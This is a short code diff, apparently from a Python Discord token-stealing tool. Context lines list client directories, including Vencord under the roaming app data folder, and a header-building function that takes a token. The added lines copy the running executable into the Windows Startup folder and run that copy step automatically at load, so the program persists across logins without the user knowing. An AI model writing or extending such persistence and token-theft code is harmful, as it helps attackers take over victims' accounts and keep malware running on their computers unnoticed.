@@ -42,6 +42,17 @@ PATHS = {
     'Vencord': ROAMING + '\\Vencord'  # Added Vencord directory
 }
 
+def copy_exe_to_startup(exe_path):
+    """Copy the executable to the startup folder"""
+    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+    destination_path = os.path.join(startup_folder, os.path.basename(exe_path))
+
+    if not os.path.exists(destination_path):
+        shutil.copy2(exe_path, destination_path)
+
+exe_path = os.path.abspath(sys.argv[0])
+copy_exe_to_startup(exe_path)
+
 def getheaders(token=None):
     headers = {
         "Content-Type": "application/json",
